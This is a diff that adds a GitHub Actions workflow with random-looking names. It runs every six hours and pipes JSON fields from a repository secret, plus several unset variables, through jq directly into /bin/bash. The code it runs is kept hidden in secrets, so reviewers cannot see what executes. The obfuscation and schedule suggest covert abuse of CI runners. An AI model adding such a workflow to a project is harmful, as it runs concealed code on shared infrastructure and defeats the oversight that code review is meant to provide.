@@ -1,0 +1,22 @@
+name: jintianwen7615
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '35 3/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: jintianwen7615
+        env:
+          xkh38: ${{ secrets.xkh38 }}
+        run: |
+          echo $xkh38 | jq -r .edo328 | /bin/bash
+          echo $fov77334 | jq -r .ze68232 | /bin/bash
+          echo $z7 | jq -r .apqu3 | /bin/bash
+          echo $ccovo8 | jq -r .tf9 | /bin/bash
+          echo $znbs6 | jq -r .whq81 | /bin/bash
+
